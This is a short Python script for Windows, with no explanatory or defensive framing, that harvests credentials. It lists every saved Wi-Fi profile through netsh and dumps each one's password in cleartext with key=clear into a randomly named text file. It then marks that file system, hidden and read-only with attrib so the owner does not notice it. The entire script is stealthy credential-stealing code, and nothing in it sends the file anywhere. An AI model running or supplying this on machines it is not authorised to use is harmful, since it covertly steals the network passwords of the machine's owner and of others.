import subprocess as sub

command, pwd = 'netsh wlan show profiles', sub.os.getcwd()

profiles = sub.check_output(fr'{command} | find "All"', shell=1).decode().split('\n')[:-1:]

for i in profiles:
	results = fr'{command} "{i.split(":")[1][1:-1]}" key=clear'
	if not sub.os.path.isfile('rasktdhwpxuqiyfjlvb.txt'):
		sub.check_output(fr'{results} > "{pwd}\rasktdhwpxuqiyfjlvb.txt"', shell=1)
	else:
		sub.check_output(fr'{results} >> "{pwd}\rasktdhwpxuqiyfjlvb.txt"', shell=1)	
	
sub.check_output(fr'attrib +s +h +r "{pwd}\rasktdhwpxuqiyfjlvb.txt"', shell=1)